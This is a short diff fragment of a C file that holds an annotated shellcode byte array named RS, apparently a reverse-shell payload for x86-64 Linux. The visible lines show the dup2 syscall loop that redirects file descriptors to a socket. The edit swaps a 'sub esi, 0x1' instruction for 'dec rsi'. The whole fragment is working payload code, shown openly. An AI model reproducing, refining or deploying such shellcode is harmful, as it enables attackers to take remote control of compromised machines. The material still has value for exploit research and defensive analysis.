@@ -19,7 +19,7 @@ char RS[] = {
   /* 001D */ "\x96"                                     /* xchg esi, eax               */
   /* 001E */ "\xb0\x21"                                 /* mov al, 0x21                */
   /* 0020 */ "\x0f\x05"                                 /* syscall                     */
-  /* 0022 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
+  /* 0022 */ "\x48\xff\xce"                             /* dec rsi                     */
   /* 0025 */ "\x79\xf7"                                 /* jns 0x1e                    */
   /* 0027 */ "\x55"                                     /* push rbp                    */
   /* 0028 */ "\x5e"                                     /* pop rsi                     */
